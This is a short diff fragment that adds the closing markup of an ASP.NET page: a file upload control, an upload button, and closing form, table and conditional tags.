+				<asp:FileUpload runat="server" ID="flUp" />
+				<asp:Button runat="server" ID="cndUpload" Text="Upload" />
+				</p>
+			</td>
+		</tr>
+    </table>
+	 </asp:Panel>
+    </form>
+	
+</body>
+</html>
+<% end if %>
